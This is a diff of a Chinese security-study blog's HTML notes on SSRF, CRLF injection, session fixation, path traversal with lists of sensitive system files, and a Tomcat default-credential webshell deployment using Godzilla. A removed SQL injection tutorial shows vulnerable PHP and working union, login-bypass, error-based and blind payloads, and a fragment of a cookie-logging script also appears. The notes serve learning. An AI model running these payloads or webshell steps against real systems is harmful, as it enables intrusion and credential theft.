+<li>这个功能如果<strong>被恶意使用</strong>，可以利用存在缺陷的web应用作为代理，<strong>攻击远程和本地的服务器。</strong></li>
+</ul>
+<p>（2）如果应用程序对用户提供的URL和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在这种服务端请求伪造的缺陷。Google,Facebook,Adobe,baidu,tencent等知名公司都被发现过这种漏洞。伪造服务端发起请求，攻击者利用ssrf可以实现的攻击主要有5种：</p>
+<ul>
+<li>.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;（.探测内网IP、端口信息）</li>
+<li>攻击运行在内网或本地的应用程序（比如溢出）;</li>
+<li>对内网web应用进行指纹识别，通过访问默认文件实现;（探测内网的Web应用程序、语言环境）</li>
+<li>攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</li>
+<li>利用file协议读取本地文件等。</li>
+</ul>
+<p>（3）<strong>探测内网需要结合Gopher协议</strong></p>
+<h3 id="Weblogic-ssrf漏洞"><a href="#Weblogic-ssrf漏洞" class="headerlink" title="Weblogic ssrf漏洞"></a>Weblogic ssrf漏洞</h3><p>（1）Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，通过对不同的请求的返回信息，进行SSRF攻击。</p>
+<ul>
+<li>探测可以访问的地址：如 <a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a></li>
+</ul>
+<p><img src="https://i.loli.net/2021/06/04/GmLU6N7ntXJbDFu.png" alt="image-20210604185837859"></p>
+<ul>
+<li>探测无法访问的地址：如 <a target="_blank" rel="noopener" href="http://www.xxxxxxxxxxxx.com/">http://www.xxxxxxxxxxxx.com</a></li>
+</ul>
+<p><img src="https://i.loli.net/2021/06/04/AzSxgmsBwe6OkNG.png" alt="image-20210604185916956"></p>
+<h2 id="HTTP拆分攻击-CRLF注入"><a href="#HTTP拆分攻击-CRLF注入" class="headerlink" title="HTTP拆分攻击/CRLF注入"></a>HTTP拆分攻击/CRLF注入</h2><p>（1）HTTP拆分（HTTP Splitting）攻击也称为CRLF注入（CRLF Injection），针对HTTP头部进行的注入（条件：前端输入的或用户可控的内容被放在HTTP头部中）</p>
+<ul>
+<li><strong>CR</strong>为回车符，ASCII为13，16进制写法为0x0d，URL编码为**%0d<strong>，也用符号</strong>\r**表示。</li>
+<li><strong>LF</strong>为换行符，ASCII为10，16进制写法为0x0a，URL编码为**%0a<strong>，也用符号</strong>\n**表示。</li>
+</ul>
+<p>（2）CRLF注入产生原理：HTTP头部如果存在<strong>用户可控的输入内容，</strong>程序没有进行过滤，就可以利用<strong>回车/换行<br>（%0d/%0a）符</strong>来<strong>创建新的头部字段</strong>，实现攻击目标。</p>
+<ul>
+<li>通过注入不同的字段可以达到不同的攻击效果，常与XSS、CSRF、会话固定等攻击手段结合使用。</li>
+<li>Set-Cookie：注入该字段可以控制用户的cookie值，可以进行会话固定等攻击。</li>
+<li>Location：注入该字段可控制页面跳转的位置，可以进行钓鱼攻击等</li>
+<li>X-XSS-Protection：注入该字段可以绕过浏览器的XSS防护功能</li>
+</ul>
+<p><img src="https://i.loli.net/2021/06/04/WqAZuXPsMLwVFm5.png" alt="image-20210604191025676"></p>
+<p>（3）http头部与HTTP正文之间是通过\x0d\0x0a\x0d\x0a来区分的，如果我们在头部插入一个\x0d\0x0a\x0d\x0a，后续的内容会被认为是HTTP的正文内容，因此可以在其后加入HTML和JavaScript来实现XSS攻击。</p>
 <p>%0d%0a表示换行，则下一行的内容会被当做HTTP头部执行</p>
 <p>如果出现了%0d%0a%0d%0a两次换行的情况，则表示后面的内容为HTTP正文。因此可以构造XSS注入。</p>
-<h3 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h3><p>登录前后的会话ID不变</p>
-<h3 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h3><h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><h3 id="服务器远程部署漏洞"><a href="#服务器远程部署漏洞" class="headerlink" title="服务器远程部署漏洞"></a>服务器远程部署漏洞</h3><p>远程部署漏洞：利用web中间件的功能，将源代码上传到服务器。若源代码为一句话木马，则可以进一步获取web服务器权限。类似于文件上传。</p>
-<p>漏洞影响范围：有图形化界面，可以直接配置网站页面的中间件（主要的有WebLogic\Jboss\Tomcat）</p>
-<p>根据不同的中间件有不同的管理方式（Tomcat），管理端–已知用户名和密码。</p>
-<h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><p>网站渗透思路：信息收集（是否存在源码泄露）、上扫描器、看对应的中间件漏洞、组件漏洞、CMS漏洞（whatweb）、手工挖掘（SQL注入、文件上传、命令执行）。</p>
+<h2 id="会话安全-会话固定攻击"><a href="#会话安全-会话固定攻击" class="headerlink" title="会话安全-会话固定攻击"></a>会话安全-会话固定攻击</h2><p>（1）固定会话：指的是用户在登陆前后，会话ID并不会发生改变。</p>
+<ul>
+<li>攻击者可以通过多种方式诱导攻击目标使用事先定义的会话ID来访问目标网站。</li>
+<li>由于会话ID是已知的，当用户登录后攻击者就可以使用相同的会话ID登录系统，直接获取登录后的权限。</li>
+</ul>
+<p>（2）攻击流程</p>
+<ul>
+<li>黑客访问网站获取sessionID；</li>
+<li>利用XSS漏洞或CRLF漏洞等方式构造攻击链接为用户预设sessionID；</li>
+<li>用户点击相关链接，获得了黑客预设的sessionID；</li>
+<li>用户登录系统；</li>
+<li>黑客通过预设的sessionID登录系统；</li>
+</ul>
+<h2 id="路径穿越与目录遍历漏洞"><a href="#路径穿越与目录遍历漏洞" class="headerlink" title="路径穿越与目录遍历漏洞"></a>路径穿越与目录遍历漏洞</h2><h3 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h3><p>（1）路径穿越漏洞：攻击者可以通过跳转字符“../”或者“..\”到达读取任意文件的目的。</p>
+<p>（2）路径穿越攻击通常发生在文件读取操作中，程序没有对跳转字符做过滤的情况下就导致网站源代码、网站配置文件、系统文件被读取，从而导致信息泄漏。</p>
+<p>（3）window下的常见敏感路径文件：</p>
+<pre><code>c:\boot.ini  //查看系统版本
+c:\windows\system32\inetsrv\metabase.xml  //IIS配置文件
+c:\windows\repair\sam  //存储windows系统初次安装的密码
+c:\Programe File\mysql\my.ini  //mysql配置文件
+c:\Programe File\mysql\data\mysql\use.MYD  //mysql root密码文件
+c:\windows\my.ini  //mysql 配置文件
+c:\windows\php.ini  //php配置文件</code></pre>
+<p>（4）linux下的常见敏感路径文件：</p>
+<pre><code>/etc/passwd         //用户信息
+/etc/apache2/apache2.conf    //apache2默认配置文件
+/usr/local/app/apache2/conf/httpd.conf    //apache2默认配置文件
+/etc/httpd/conf/httpd.conf       //apache2默认配置文件
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf    //虚拟主机设置
+/usr/local/app/php5/lib/php.ini    //php配置文件
+/etc/my.cnf    //Mysql配置文件</code></pre>
+<h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><p>（1）由于某些中间件配置错误，使得攻击者能够访问受限制的目录，并在Web服务器的根目录以外执行命令。</p>
+<ul>
+<li>利用这个漏洞，攻击者能够走出服务器的根目录，从而访问到文件系统的其他部分，譬如攻击者就能够看到一些受限制的文件，或者更危险的，攻击者能够执行一些造成整个系统崩溃的指令。</li>
+</ul>
+<p><img src="https://i.loli.net/2021/06/04/FPhzBHXifNMEyx3.png" alt="image-20210604200243726"></p>
+<h2 id="服务器远程部署漏洞"><a href="#服务器远程部署漏洞" class="headerlink" title="服务器远程部署漏洞"></a>服务器远程部署漏洞</h2><p>（1）远程部署是Web服务器中间件的一种可以直接将源码上传到服务器的功能。</p>
+<ul>
+<li>如果远程部署配置不当，攻击者就可以上传Webshell直接入侵服务器。</li>
+<li>常见的中间件如Tomcat、Weblogic、Jboss、FTP都具有远程部署功能。</li>
+<li>常见的中间件及部署管理端口地址-默认口令表如下：</li>
+</ul>
+<p><img src="https://i.loli.net/2021/06/04/Y5bTzs61nBRoCFJ.png" alt="image-20210604200505406"></p>
+<p>（2）远程部署漏洞：利用web中间件的功能，将源代码上传到服务器。若源代码为一句话木马，则可以进一步获取web服务器权限。类似于文件上传。</p>
+<ul>
+<li>漏洞影响范围：有图形化界面，可以直接配置网站页面的中间件（主要的有WebLogic\Jboss\Tomcat）</li>
+<li>根据不同的中间件有不同的管理方式（Tomcat），管理端–已知用户名和密码。</li>
+</ul>
+<h3 id="Tomcat服务远程部署"><a href="#Tomcat服务远程部署" class="headerlink" title="Tomcat服务远程部署"></a>Tomcat服务远程部署</h3><p>（1）登陆Tomcat管理后台。打开<a href="http://192.168.14.140:8080进入Tomcat服务器管理后台帐号密码tomcat/tomcat。">http://192.168.14.140:8080进入Tomcat服务器管理后台帐号密码tomcat/tomcat。</a></p>
+<p><img src="https://i.loli.net/2021/06/04/lX9LkytfOGCvJiA.jpg" alt="img"></p>
+<p>（2）制作war包木马。使用Godzilla生成jsp木马，在sr.jsp所在文件夹下执行以下命令制作war包木马。</p>
+<p><img src="https://i.loli.net/2021/06/04/SrYVZi7ucHFyh1M.png" alt="image-20210604200928889"></p>
+<p><img src="https://i.loli.net/2021/06/04/wl4aHcXmptB2P5i.png" alt="image-20210604200941270"></p>
+<pre><code>jar cvf sr.war sr.jsp</code></pre>
+<p><img src="https://i.loli.net/2021/06/04/3VcPaDYhgBubOo9.png" alt="image-20210604201004608"></p>
+<p><img src="https://i.loli.net/2021/06/04/6krOdizaGSMRIXH.png" alt="image-20210604201013485"></p>
+<p>（3）上传部署war包。可以在应用列表中看见sr项目已成功部署。</p>
+<p><img src="https://i.loli.net/2021/06/04/4xp7s6OJ2fY5CHv.png" alt="image-20210604201031919"></p>
+<p><img src="https://i.loli.net/2021/06/04/oWhAiaQUZc1eBsV.png" alt="image-20210604201050973"></p>
+<p>（4）使用Godzilla连接sr.jsp木马。</p>
+<p><img src="https://i.loli.net/2021/06/04/AVH8nwCeflqju1Q.png" alt="image-20210604201143753"></p>
+<p><img src="https://i.loli.net/2021/06/04/F5TE1ZKkr7tWbyR.png" alt="image-20210604201201389"></p>
+<h2 id="常见编辑器漏洞"><a href="#常见编辑器漏洞" class="headerlink" title="常见编辑器漏洞"></a>常见编辑器漏洞</h2><p>（1）开源的编辑器经常被网站作为第三方组件而直接使用，而这些编辑器不同版本存在着不同的上传漏洞、解析漏洞、任意文件删除、目录遍历等漏洞。</p>
+<p>（2）常见的编辑器有：</p>
+<ul>
+<li>FCKeditor</li>
+<li>eWebEditor</li>
+<li>Cute Editor</li>
+<li>Webhtmleditor</li>
+<li>Kindeditor</li>
+<li>Freetextbox</li>
+<li>Msn sditor</li>
+</ul>
+<p>（3）更多资料请查阅：<a target="_blank" rel="noopener" href="http://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/">http://navisec.it/编辑器漏洞手册/ </a></p>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p><img src="https://i.loli.net/2021/05/18/fgMdmTUVkb3lv2Z.png" alt="image-20210518192126794"></p>
+<p>网站渗透思路：信息收集（是否存在源码泄露）、上扫描器、看对应的中间件漏洞、组件漏洞、CMS漏洞（whatweb）、手工挖掘（SQL注入、文件上传、命令执行）。</p>
 <p>vim –.文件名.swp swo swn</p>
 <p>index.php意外关闭时会在同目录下生成.index.php.swp</p>
 <p>/.get/</p>
@@ -1574,7 +1966,7 @@ $content=$time.&quot;::&quot;.&quot;$refer&quot;.&quot;::&quot;.$cookie.&quot;\r
 file_put_contents(&quot;cookie.txt&quot;,$content,FILE_APPEND);
 ?&gt;</code></pre>
 <h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>（1）XSS利用DOM的结构定义</p>
-<p>（2）DOM结构是将HTML文件的节点构建成树状结构，以此反应HTML本身的阶层结构。用过构造javascript恶意语句就可以修改HTML的DOM结构中的某个值，从而触发跨站脚本攻击。</p>
+<p>（2）DOM结构是将HTML文件的节点构建成树状结构，以此反应HTML本身的阶层结构。通过构造javascript恶意语句就可以修改HTML的DOM结构中的某个值，从而触发跨站脚本攻击。</p>
 <pre><code class="html">&lt;html&gt;
 &lt;head&gt;
 &lt;title&gt;DOM XSS&lt;/title&gt;
@@ -2709,467 +3101,6 @@ print(getHTMLText(url))</code></pre>
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/04/18/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%BA%94)-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%92%8C%E8%87%AA%E5%8A%A8%E5%8C%9601/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-安全进阶/SQL注入原理与实践进阶" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">SQL注入原理与实践进阶</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" class="archive-article-date">
-  	<time datetime="2021-04-18T01:41:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h2><p>动态页面有时会通过脚本引擎将用户输入的参数按照预先设定的规则构造成SQL语句来进行数据库操作，<strong>SQL注入攻击</strong>指的是通过<strong>构建特殊的输入作为参数传入Web应用程序，</strong>改变原有的SQL语句的语义来执行攻击者所要的操作，其主要原因是程序<strong>没有采用必要的措施避免用户输入内容改变原有SQL语句的语义。</strong></p>
-<h3 id="从程序编写的角度看SQL注入"><a href="#从程序编写的角度看SQL注入" class="headerlink" title="从程序编写的角度看SQL注入"></a>从程序编写的角度看SQL注入</h3><p>SQL注入漏洞产生的本质原因是<strong>将获取到的用户可控数据在没有经过安全处理的情况下拼接到SQL语句中并发送给数据库服务器执行导致的。</strong></p>
-<pre><code class="php">&lt;?php
-$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,sqleasy);
-$newsid=$_GET[&#39;newsid&#39;];   //用户可控输入(GET情趣的newsid参数)
-
-//拼接到了发送数据库服务器执行的SQL语句中
-$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);
-$row = mysqli_fetch_array($result);
-
-echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;
-echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;;
-?&gt;</code></pre>
-<h3 id="SQL注入的常见场景"><a href="#SQL注入的常见场景" class="headerlink" title="SQL注入的常见场景"></a>SQL注入的常见场景</h3><h4 id="数据查询功能"><a href="#数据查询功能" class="headerlink" title="数据查询功能"></a>数据查询功能</h4><p>数据查询功能是WEB应用最常见的功能之一，实现方式就是<strong>根据用户提交的查询条件将数据库中的信息查询出来并显示在页面上，此时用户提交的数据通常被拼接到SQL语句的查询条件位置（即where之后）</strong>，这种情况下如果没有进行安全处理，使用<strong>联合查询注入</strong>的方式可以很方便的获取数据库的敏感信息。</p>
-<ul>
-<li>程序员思维</li>
-</ul>
-<pre><code class="php">//获取用户的查询条件：
-$newsid=$_GET[&#39;newsid&#39;];
-
-//构造SQL语句查询相关信息
-$result = mysqli_query($con,&quot;SELECT title,context 
-FROM `news` WHERE newsid=$newsid&quot;);
-
-//将结果显示在页面上：
-$row = mysqli_fetch_array($result);
-echo &quot;公告标题 : &quot;.$row[&#39;title&#39;].&quot;&lt;br/&gt;&quot;;
-echo &quot;公告内容 : &quot;.$row[&#39;context&#39;].&quot;&lt;br/&gt;&quot;</code></pre>
-<ul>
-<li>黑客思维</li>
-</ul>
-<pre><code class="sql">联合查询注入
-http://127.0.0.1/sqleasy_webjj/news.php?newsid=0 union select username,password from admin;
-
-实际执行语句
-SELECT title,context FROM `news` WHERE newsid=0 union select username,password from admin;</code></pre>
-<h4 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h4><p>登录功能也是WEB应用的常见功能之一，通常的实现方式就是<strong>将用户输入的用户名和密码在数据库中查询，如果有匹配的结果说明用户名密码正确，即判断为登录成功，否则就登录失败。</strong>这个过程中用户输入的用户名和密码通常也会被拼接到SQL语句的查询条件位置（即where之后），这种情况下如果没有进行安全处理，<strong>攻击者可以插入恶意的SQL语句改变判断条件的结果，达到登录任意账号的目的（即通常说的万能密码攻击）。</strong></p>
-<ul>
-<li>程序员思维</li>
-</ul>
-<pre><code class="php">//获取用户输入的用户名和密码：
-$name=$_POST[&#39;username&#39;]; 
-$pwd=$_POST[&#39;password&#39;];
-
-//构造SQL语句查询admin表中是否有匹配的信息
-$result = mysqli_query($con,&quot;select * from admin 
-where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;);
-
-//根据结果集是否为空判断账号密码是否存在
-$res=mysql_fetch_array($result); 
-if(is_array($res))&#123;
-$login=true;    
-&#125;else&#123; 
-   $login=false; &#125;</code></pre>
-<ul>
-<li>黑客思维</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/23/PrFV5YDpbjoJUa8.png" alt="image-20210423162120756"></p>
-<pre><code class="sql">实际执行语句
-select * from admin where username=&#39;jiaoshou&#39;or&#39;1&#39; and password=&#39;adjflajsdlfl&#39;</code></pre>
-<h4 id="程序将错误信息直接返回页面"><a href="#程序将错误信息直接返回页面" class="headerlink" title="程序将错误信息直接返回页面"></a>程序将错误信息直接返回页面</h4><p>为了方便程序调试，许多程序员会<strong>将SQL查询的报错信息直接回显到页面上。</strong>这种情况下黑客可以<strong>利用特殊的<br>函数或者语法构造错误的SQL语句，使得敏感数据通过报错信息直接回显到页面上。</strong>对于<strong>在线的WEB系统</strong>而言，<br>程序的<strong>错误信息应该记录到日志中</strong>，而不是显示在页面上。</p>
-<ul>
-<li>程序员思维</li>
-</ul>
-<pre><code class="php">//在SQL语句执行后打印报错信息，方便调试
-$result = mysqli_query($con,&quot;SELECT title,context FROM `news` WHERE newsid=&#39;$newsid&#39;&quot;);
-if(!empty(mysqli_error($con)))&#123; 
-    echo mysqli_error($con);
-&#125;
-
-//mysqli_error() 函数返回最近调用函数的最后一个错误描述。
-//empty($var) empty()用来检查变量var是否为空，若var为空则返回true，当var存在且是一个非空非零的值时返回false。</code></pre>
-<ul>
-<li>黑客思维</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/23/wiyFLTR1EuBmsJg.png" alt="image-20210423171401714"></p>
-<pre><code class="sql">实际执行语句：SELECT title,context FROM `news` WHERE newsid= 11 and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></pre>
-<h4 id="基于查询条件返回判断结果"><a href="#基于查询条件返回判断结果" class="headerlink" title="基于查询条件返回判断结果"></a>基于查询条件返回判断结果</h4><p>有时候某些功能是<strong>根据用户输入的查询条件，去数据库中查询相关数据，但不会返回查询结果，而是根据查询<br>结果的情况返回某些信息。</strong>例如，根据学生学号查询成绩，根据查询到的分数返回是否及格（而不是具体分数）。<br>由于数据库中的信息不会直接返回到页面，<strong>无法使用联合查询注入</strong>，如果程序员<strong>也没有输出报错信息到页面上</strong>，那<br>么我们是无法直接通过SQL注入获取数据的。此时，<strong>可以采用盲注的方式来尝试获取数据。</strong></p>
-<ul>
-<li>程序员思维</li>
-</ul>
-<pre><code class="php">//获取用户输入的学生id
-$id = $_GET[&#39;id&#39;];
-//构造SQL语句查询info表中是否有匹配的信息
-$result = mysqli_query($con, &quot;SELECT score FROM `info` WHERE id=&#39;$id&#39;&quot;);
-$row = mysqli_fetch_array($result);
-//判断结果是否为空
-    if (is_array($row)) &#123;     //is_array用于检测变量是否为一个数组
-//判断成绩是否及格
-        if ($row[&#39;score&#39;] &gt;= 60) &#123;
-            echo &quot;$id 号同学，恭喜你，成绩及格了&quot;;
-        &#125; else &#123;echo &quot;$id 号同学，很遗憾，你没有及格&quot;;&#125;
-    &#125; else &#123;echo &quot;对不起，你输入的学号不存在&quot;;&#125;&#125;</code></pre>
-<ul>
-<li>黑客思维</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/23/4r2Vj7gG9L6NuQT.png" alt="image-20210423171310802"></p>
-<pre><code class="sql">--substr(string,1,1) 返回字符串的一部分。例如下方代码，返回从第1个到第1个字符
--- 实际执行语句：
-SELECT score FROM `info` WHERE id=1024 and substr(database(),1,1)=&#39;s&#39;</code></pre>
-<h4 id="数据的插入、修改与删除功能"><a href="#数据的插入、修改与删除功能" class="headerlink" title="数据的插入、修改与删除功能"></a>数据的插入、修改与删除功能</h4><p>除了查询相关的功能以外，对数据库的数据进行数据插入、修改、删除操作也是常见的功能（insert、update<br>、delete），这些功能与查询语句不同的是并不会返回结果集数据（只会返回成功失败的状态码），如果又没有输<br>出报错信息，即使用户输入的数据没有进行安全处理，也难以使用联合查询、报错注入、布尔型盲注等方式注入，<br>这时，<strong>可以采用时间型盲注进行注入。</strong></p>
-<ul>
-<li>程序员思维</li>
-</ul>
-<pre><code class="php">//获取用户输入的信息
-$username = $_POST[&#39;username&#39;];
-$passwd = $_POST[&#39;passwd1&#39;];
-$question = $_POST[&#39;question&#39;];
-$answer = $_POST[&#39;answer&#39;];
-//构造SQL语句将用户输入的信息插入数据库
-$query = &quot;INSERT INTO 
-admin(role,username,password,question,answer) VALUES 
-(&#39;student&#39;,&#39;$username&#39;,&#39;$passwd&#39;,&#39;$question&#39;,&#39;$answer&#39;
-)&quot;;
-mysql_query($query) or die(&quot;Error!!&quot;);</code></pre>
-<ul>
-<li>黑客思维</li>
-</ul>
-<p><img src="C:\Users\86177\AppData\Roaming\Typora\typora-user-images\image-20210423172110563.png" alt="image-20210423172110563"></p>
-<pre><code class="sql">--实际执行语句：
-INSERT INTO admin(role,username,password,question,answer) 
-VALUES (&#39;student&#39;,&#39;test2&#39;,&#39;test2&#39;,&#39;&#39;,if(left(database(),1)=&#39;s&#39;,sleep(3),0))#&#39;,&#39;ndsec&#39;)</code></pre>
-<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><table>
-<thead>
-<tr>
-<th align="center">基于注入点位置分类</th>
-<th align="center">基于变量数据类型分类</th>
-<th align="center">基于获取数据的方法分类</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">GET注入、POST注入、Cookie注入</td>
-<td align="center">字符型注入、数字型注入</td>
-<td align="center">基于回显、基于错误、盲注(布尔型盲注、基于时间盲注)</td>
-</tr>
-</tbody></table>
-<h2 id="SQL注入点的查找与判断"><a href="#SQL注入点的查找与判断" class="headerlink" title="SQL注入点的查找与判断"></a>SQL注入点的查找与判断</h2><h3 id="SQL注入测试方法"><a href="#SQL注入测试方法" class="headerlink" title="SQL注入测试方法"></a>SQL注入测试方法</h3><p>SQL注入漏洞的测试主要包括<strong>寻找可能的注入点</strong>以及<strong>针对可能的注入点进行测试</strong>两个环节，核心思路和流程如下：</p>
-<p><img src="https://i.loli.net/2021/04/23/qFYGkpnrQszyJUK.png" alt="image-20210423172821267"></p>
-<h3 id="寻找可能的注入点"><a href="#寻找可能的注入点" class="headerlink" title="寻找可能的注入点"></a>寻找可能的注入点</h3><h4 id="服务器能取到的用户输入"><a href="#服务器能取到的用户输入" class="headerlink" title="服务器能取到的用户输入"></a>服务器能取到的用户输入</h4><p>（1）<strong>任何服务器能取到的用户输入，都是可能存在SQL注入的注入点，</strong>对于手工测试而言，通常根据业务找寻可能与数据库有交互的输入作为潜在的注入点进行测试。</p>
-<p>（2）常见注入点：</p>
-<ul>
-<li>表单提交，主要是POST请求，也包括GET请求。</li>
-<li>URL参数提交，主要为GET请求参数。</li>
-<li>Cookie参数提交。</li>
-<li>HTTP请求头部可修改的值，比如：Referer、User_Agent等。</li>
-<li>边缘的输入点，比如.mp3文件的一些文件信息等。</li>
-</ul>
-<p><strong>PS：以PHP为例，通过各类超全局变量可以取到各类用户输入，这些都是潜在的注入点</strong></p>
-<h4 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h4><ul>
-<li>GET请求和POST请求的参数值是最常见的注入点，是测试时需要重点关注的地方。</li>
-<li>除了标准的请求参数值，采用一些特殊数据传输格式的参数值也有可能存在注入点，如JSON或XML格式传输的参<br>数值。</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/23/ESf3YZi76wldJCF.png" alt="image-20210423181050875"></p>
-<p><img src="https://i.loli.net/2021/04/23/nlqosbjvWRXBi59.png" alt="image-20210423181119960"></p>
-<ul>
-<li>Cookie中的一些字段有时也会用于数据库查询或其他操作，往往也是需要关注的潜在注入点。</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/23/6OvbCryUKpWoDMh.png" alt="image-20210423181155681"></p>
-<ul>
-<li>HTTP请求头部的其他字段也可能存在注入点，如refer字段有时会被写入数据库。</li>
-</ul>
-<p><img src="https://i.loli.net/2021/04/23/A8XJ4hVqDHrg3sc.png" alt="image-20210423181231673"></p>
-<h3 id="SQL注入点的测试"><a href="#SQL注入点的测试" class="headerlink" title="SQL注入点的测试"></a>SQL注入点的测试</h3><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>SQL注入点的测试本质上是基于原理的模糊测试，我们需要根据一个注入点的功能，推测其可能使用的SQL操作、用户输入的数据类型（数字型或字符型）以及用户输入拼接到SQL语句的位置，并尝试构造基础的报错注入语句、布尔盲注或时间盲注语句来验证相关位置是否存在sql注入漏洞。</p>
-<p><strong>注意：在未知源码的情况下，我们只能尽可能尝试构造各类测试语句来对注入点进行测试，如果测试现象符合条件可以认为存在SQL注入漏洞，但测试现象不符合预期并不能100%确定SQL注入漏洞不存在。</strong></p>
-<p><img src="https://i.loli.net/2021/04/23/htUOibI7gH4QRcA.png" alt="image-20210423184225134"></p>
-<h4 id="构造报错注入语句"><a href="#构造报错注入语句" class="headerlink" title="构造报错注入语句"></a>构造报错注入语句</h4><p>在进行SQL注入点测试的时候，<strong>构造报错注入语句是第一步，</strong>报错注入语句的构造相对简单，通常<strong>只要在参数值中增加一些常见的符号就可以让SQL语句产生语法错误</strong>，常见可使用的符号包括单引号、双引号、括号、分号、冒号、斜杠、反斜杠等，可以将这些符号<strong>组合使用</strong>进行尝试。</p>
-<p><img src="https://i.loli.net/2021/04/23/VW2uQz5rx4UHpiv.png" alt="image-20210423184705988"></p>
-<h4 id="报错注入结果判断"><a href="#报错注入结果判断" class="headerlink" title="报错注入结果判断"></a>报错注入结果判断</h4><p>（1）<strong>出现数据库原始报错信息，可以确定存在SQL注入漏洞.</strong></p>
-<p><img src="https://i.loli.net/2021/04/23/WrFHQOf7xXAzcVZ.png" alt="image-20210423184915060"></p>
-<p><img src="https://i.loli.net/2021/04/23/YqhPbHlTLux1oE3.png" alt="image-20210423184815009"></p>
-<p>（2）在输入某些测试payload时导致页面显示异常，包括结果显示异常或出现通用报错信息，都有可能是SQL注入漏洞但也有可能是系统正常的错误处理机制导致的，需要进一步测试。对于没有回显的语句（如插入、修改功能），可以<strong>根据操作结果返回包的状态码、包长度等信息推测SQL语句是否出错。</strong></p>
-<h4 id="布尔型盲注语句的构造"><a href="#布尔型盲注语句的构造" class="headerlink" title="布尔型盲注语句的构造"></a>布尔型盲注语句的构造</h4><p>（1）布尔型盲注语句需要在涉及判断的功能中才能使用，其中最常见的就是在查询条件的位置，分别拼接上一段结果为真和结果为假的判断语句，如果<strong>结果为真时显示效果与原来一致，结果为假时查询不到数据或与原来数据不一致，则认为存在布尔型盲注。</strong></p>
-<p>（2）布尔型盲注的本质就是构造两个分别为真和假的表达式，只要符按照这个思路，可以任意进行构造。</p>
-<p><img src="https://i.loli.net/2021/04/23/lBdabnu4yxCEhwV.png" alt="image-20210423185446985"></p>
-<p><img src="https://i.loli.net/2021/04/23/TCYSLltKdFQJ1nu.png" alt="image-20210423185511489"></p>
-<h4 id="时间型盲注语句构造"><a href="#时间型盲注语句构造" class="headerlink" title="时间型盲注语句构造"></a>时间型盲注语句构造</h4><p>（1）对于没有涉及判断的功能，如插入、更新等语句的数据位置（而非条件语句的位置），或者布尔型盲注的结果无法判断的（如显示均正常或均异常），可以尝试使用时间型盲注语句进行测试，<strong>如果插入时间型盲注语句后服务器延时响应，则认为存在SQL注入漏洞。</strong></p>
